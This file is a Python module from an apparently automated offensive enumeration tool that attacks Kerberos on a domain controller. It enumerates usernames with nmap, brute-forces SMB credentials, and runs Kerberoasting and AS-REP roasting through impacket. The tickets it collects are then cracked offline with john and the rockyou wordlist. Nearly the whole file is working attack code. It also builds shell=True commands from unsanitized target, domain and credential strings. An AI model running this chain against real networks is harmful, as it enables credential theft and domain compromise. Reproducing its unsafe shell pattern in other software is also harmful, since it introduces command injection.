from mods.mod_utils import print_banner, printc, log, print_separator, GREEN, BLUE, RED
from mods.mod_smb import bruteforce, rid_cycling, export_wordlists, smb_passwords
import subprocess
import os
import re


def enum_users(target, domain):
    filename = '/usr/share/seclists/Usernames/Names/names.txt'
    cmd = f'nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="{domain}",userdb="{filename}" {target}'
    output = None
    users = []
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)

        if output:
            if ('Discovered' in output):
                print_banner('88')
                print('[!] KERBEROS')
                print(f'[!] {cmd}')
                printc('[+] Some usernames where found.', GREEN)
                for line in output.splitlines():
                    if domain in line:
                        user = line.split('@')[0].split(' ')[-1]
                        printc(user, BLUE)
                        users.append(user)
            log(output, cmd, target, 'nmap')
    except Exception as e:
        if not os.path.exists(filename):
            print(f'[-] {filename} does not exist.\nPlease install seclists.')
        printc(f'[-] {e}', RED)
        return users
    return users


def check_rockyou():
    if not os.path.exists('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt'):
        if os.path.exists('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz'):
            unzip_cmd = 'tar -xzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz'
            print('[!] Trying to unzip rockyou.txt.')
            print(f'[!] {unzip_cmd}')
            try:
                subprocess.check_output(unzip_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                mv_cmd = 'mv rockyou.txt /usr/share/seclists/Passwords/Leaked-Databases/'
                subprocess.check_output(mv_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            except Exception as e:
                printc(f'[-] {e}', RED)
        else:
            print('[!] Seclist is not installed or rockyou.txt.tar.gz is not on the default folder.')


def crack_tickets():
    if os.path.exists('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt'):
        print('[!] Trying to crack the tickets.')
        john_cmd = 'john tickets.txt -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules=best64'
        print(f'[!] {john_cmd}')
        output = None
        try:
            output = subprocess.check_output(john_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        except Exception as e:
            printc(f'[-] {e}', RED)
        if output:
            printc('[+] Tickets cracked successfully.', GREEN)
            print(output)

            log(output, john_cmd, '', 'john')


def print_cracking_cmd():
    print('[!] To crack the tickets you can use john.')
    print('[!] john tickets.txt -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules=best64')
    print('[!] If the command does not work, unzip the rockyou.txt wordlist first')


def check_kerberoast(target, domain, user='Guest', passw=''):
    cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth -request -output tickets.txt'

    if (user == 'Guest'):
        cmd = f'impacket-GetUserSPNs {domain}/jhon.doe -no-pass -dc-ip {target} -stealth -request -output tickets.txt'

    output = None
    output = None
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)

    if output:
        if ('ServicePrincipalName' in output):
            print_banner('88')
            print('[!] KERBEROS')
            print(f'[!] {cmd}')
            printc(f'[+] Some Kerberoastable users where found with the credentials "{user}:{passw}"', GREEN)
            for line in output.splitlines():
                passw_last_set = re.findall(r'....-..-..\s.*:.*:.*\.', line)
                if passw_last_set:
                    re_user = re.findall(r'.+\s(\w+)\s', line)
                    if re_user:
                        kerberoastable_user = re_user[0]
                        printc(f'[+] {kerberoastable_user}', BLUE)
            log(output, cmd, target, 'impacket-GetUserSPNs')


            cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth -request -output tickets.txt'
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)

            print_separator()
            print('[!] Requesting tickets.')
            print(f'[!] {cmd}')

            log(output, cmd, target, 'impacket-GetUserSPNs')

            if ('KRB_AP_ERR_SKEW' in output):
                printc('[-] Requesting tickets failed.', RED)
                print('[!] Trying to Synchronize TIME with server.')
                time_cmd = f'sntp -sS {target}'
                print(f'[!] {time_cmd}')
                output = subprocess.check_output(time_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)

                log(output, time_cmd, target, 'sntp')

                if not output:
                    printc('[-] Synchronize failed.', RED)
                    return
                printc('[+] Synchronize Success.', GREEN)
                print('[!] Requesting tickets.')

                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                if output:
                    log(output, cmd, target, 'impacket-GetUserSPNs')
                else:
                    printc('[-] Tickets request failed. Try again.', RED)
                    return
            if os.path.exists('tickets.txt'):
                printc('[+] Tickets stored in tickets.txt', GREEN)
                print_cracking_cmd()
                print_separator()
                try:
                    check_rockyou()
                except Exception as e:
                    printc(f'[-] {e}', RED)


def check_smb_credentials(target, domain):
    #print('checking smb credentials file')
    # Check credentials founded on SMB first:
    if os.path.exists('smb_credentials.txt'):
        with open('smb_credentials.txt', 'r') as file:
            credentials = file.readlines()
        cred = ''
        for item in credentials:
            if ('Guest' not in item) and (':' in item):
                cred = item
                user, passwd = cred.split(':')[:2]
                #print('check kerberoast with creds')
                check_kerberoast(target, domain, user, passwd)
                #print('try to regenerate smb_users.txt file using creds before asreproast')
                rid_cycling(target=target, domain=domain, user=user, passw=passwd)
                #print('check asreproast with creds')
                check_asreproast(target, domain, user, passwd)
                return True
    return False


def check_asreproast(target, domain, user='Guest', passw=''):
    # NULL
    filename = 'smb_users.txt'
    if not (os.path.exists(filename)):
        return
    if (user == 'Guest'):
        cmd = f'impacket-GetNPUsers -no-pass {domain}/guest -dc-ip {target} -usersfile {filename} -output tickets.txt'
    # Creds
    cmd = f'impacket-GetNPUsers {domain}/{user}:{passw} -dc-ip {target} -usersfile {filename} -output tickets.txt'

    output = None
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)

    if output:
        if (domain.upper() in output):
            banner_printed = False
            for line in output.splitlines():
                if (domain.upper() in line) and (target not in line):
                    if not banner_printed:
                        print_banner('88')
                        print('[!] KERBEROS')
                        print(f'[!] {cmd}')
                        printc('[+] ASREPRoastable accounts founded.', GREEN)
                    printc(f'[+] {line}', BLUE)
                    log(output, cmd, target, 'impacket-GetNPUsers')


def bruteforce_kerberos_users(target, domain):
    # Try to bruteforce Usernames
    users = enum_users(target, domain)

    if (len(users) > 0):
        # Try to bruteforce users credentials
        export_wordlists(users, smb_passwords)
        bruteforce(target, '445')
        if not check_smb_credentials(target, domain):
            # Check Kerberoast using guest creds
            check_kerberoast(target, domain)
            check_asreproast(target, domain)



def handle_kerberos(target, domain):
    #printc('kerberos', RED)

    if (len(domain) < 3):
        return
    rid_cycling(target=target, domain=domain)
    if os.path.exists('smb_users.txt'):
        bruteforce(target, 445)
    if not check_smb_credentials(target, domain):
        bruteforce_kerberos_users(target, domain)
